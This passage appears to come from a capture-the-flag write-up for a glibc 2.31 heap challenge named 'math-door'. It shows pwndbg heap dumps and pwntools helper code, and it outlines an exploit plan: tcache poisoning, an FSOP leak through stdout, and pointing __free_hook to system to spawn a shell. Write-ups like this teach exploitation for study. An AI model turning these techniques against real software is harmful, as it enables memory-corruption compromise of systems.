+</code></pre></div><p>Here we have the chance to add three 8-byte numbers to the numbers that is currently on the selected chunk&rsquo;s data area. We can use GDB to confirm this is true:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">math-door</span>
+Reading symbols from <span class="code-dark-green">math-door</span>...
+(No debugging symbols found in <span class="code-dark-green">math-door</span>)
+<span class="code-red">pwndbg&gt; </span>run
+Starting program: /tmp/math-door
+You are facing the mathy door!
+The door is blocked by a mysterious riddle that hasn't been solved since the ancient times...
+It's said that it's beyond human comprehension. That only alien beings can understand such advanced concepts.
+Can you math your way through?
+1. Create
+2. Delete
+3. Add value
+Action:
+1
+Hieroglyph created with index 0.
+1. Create
+2. Delete
+3. Add value
+Action:
+3
+Hieroglyph index:
+0
+Value to add to hieroglyph:
+255
+1. Create
+2. Delete
+3. Add value
+Action:
+^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007ffff7ee2fd2</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7fffffffe700, <span class="code-dark-cyan">nbytes</span>=31) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+
+0x55555555b000  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000291</span>      <span class="code-dark-cyan">................</span>
+0x55555555b010  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b020  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b030  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b040  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b050  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b060  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b070  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b080  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b090  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b100  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b110  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b120  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b130  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b140  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b150  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b160  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b170  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b180  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b190  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b200  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b210  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b220  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b230  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b240  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b250  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b260  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b270  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b280  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b290  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000021</span>      <span class="code-dark-magenta">........!.......</span>
+0x55555555b2a0  <span class="code-dark-magenta">0x000000000a353532</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">255.............</span>
+0x55555555b2b0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000020d51</span>      <span class="code-dark-green">........Q.......</span>         &lt;-- Top chunk  
+</code></pre></div><p>Notice that <code>0x0a353532</code> is <code>"255\n"</code> in little-endian format as a hexadecimal number. If we add the same data, the chunk will store the result of the sum:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>continue
+Continuing.
+3
+Hieroglyph index:
+0
+Value to add to hieroglyph:
+255
+1. Create
+2. Delete
+3. Add value
+Action:
+^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007ffff7ee2fd2</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7fffffffe700, <span class="code-dark-cyan">nbytes</span>=31) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+
+0x55555555b000  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000291</span>      <span class="code-dark-cyan">................</span>
+0x55555555b010  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b020  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b030  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b040  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b050  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b060  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b070  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b080  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b090  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b0f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b100  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b110  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b120  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b130  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b140  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b150  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b160  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b170  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b180  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b190  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b1f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b200  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b210  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b220  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b230  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b240  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b250  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b260  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b270  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b280  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b290  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000021</span>      <span class="code-dark-magenta">........!.......</span>
+0x55555555b2a0  <span class="code-dark-magenta">0x00000000146a6a64</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">djj.............</span>
+0x55555555b2b0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000020d51</span>      <span class="code-dark-green">........Q.......</span>         &lt;-- Top chunk  
+<span class="code-red">pwndbg&gt; </span>p/x 0x0a353532 + 0x0a353532
+$1 = 0x146a6a64
+</code></pre></div><p>There are no more useful functions in the binary&mldr;</p><h2 id="exploit-strategy">Exploit strategy</h2><p>The main problem with this program is that there are no simple ways to leak memory addresses. Also, the program only allows us to allocate chunks of size <code>0x21</code>.</p><p>The only primitives we have are:</p><ul><li>Potential double free in <code>delete</code></li><li>Write After Free in <code>math</code></li></ul><p>We are using Glibc 2.31 with Tcache. Therefore, a good option is to use Tcache poisoning to achieve an arbitrary write primitive. For this attack to work, we need to free a chunk, modify the <code>fd</code> pointer to the target location and allocate chunks until we have one at the target address.</p><p>In heap challenges, it is very common to use an Unsorted Bin chunk to leak an address of Glibc (actually, an offset to <code>main_arena</code>). This time, we can only allocate chunks with size <code>0x21</code>. However, we can use Tcache poisoning to modify the size of a chunk and then free it, so that the heap allocator thinks its size very big and it does not fit in the Tcache free-list.</p><p>Remember that the program allows to add numbers to the ones that are in a certain chunk. Therefore, we will use this Glibc address to point to other addresses within Glibc using offsets.</p><p>Possibly, there is a way to exploit the binary using only offsets, but I could not find it. My exploit needed to know a Glibc address to find the base address and make <code>__free_hook</code> point to <code>system</code> to run <code>system("/bin/sh")</code> as the final step. To leak memory addresses within Glibc, I had to mess around with the <code>stdout</code> (<code>_IO_2_1_stdout_</code>) <code>FILE</code> structure. This technique is known as FILE Stream Oriented Programming (FSOP), more information on these links:</p><ul><li><a href="https://vigneshsrao.github.io/posts/babytcache/">babytcache</a></li><li><a href="https://sh4dy.com/notes/pwn/heap-exploitation/fsop.html">fsop</a></li><li><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">FILE-Structure-Exploitation</a></li><li><a href="https://github.com/Icefrog2000/Documents/blob/master/D1%20-%20FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">Angelboy</a></li></ul><h2 id="exploit-development">Exploit development</h2><p>First of all, I will use these helper functions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Action: </span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Action: </span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Hieroglyph index:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">x</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">y</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">z</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk1">value</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">x</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">y</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">z</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Action: </span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Hieroglyph index:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Value to add to hieroglyph:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">value</span><span class="mtk1">)</span>
+</code></pre></div><p>Now, let&rsquo;s enter create some chunks and free them to see how we can use Tcache poisoning to create a fake Unsorted Bin chunk:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>  
+
+<span class="mtk1">    </span><span class="mtk1">M</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">5</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk1">M</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk1">M</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span>, i<span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><p>Now, let&rsquo;s take a look at GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './math-door'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Starting local process './math-door': pid 323994
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './math-door', '323994', '-x', '/tmp/pwn5a9d62_q.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Switching to interactive mode
+Hieroglyph created with index 4.
+1. Create
+2. Delete
+3. Add value
+Action:
+<span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+
+0x561a5b60c000  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000291</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c010  <span class="code-dark-cyan">0x0000000000000005</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c020  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c030  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c040  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c050  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c060  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c070  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c080  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c090  <span class="code-dark-cyan">0x0000561a5b60c320</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan"> .`[.V..........</span>
+0x561a5b60c0a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c0b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c0c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c0d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c0e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c0f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c100  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c110  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c120  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c130  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c140  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c150  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c160  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c170  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c180  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c190  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c1a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
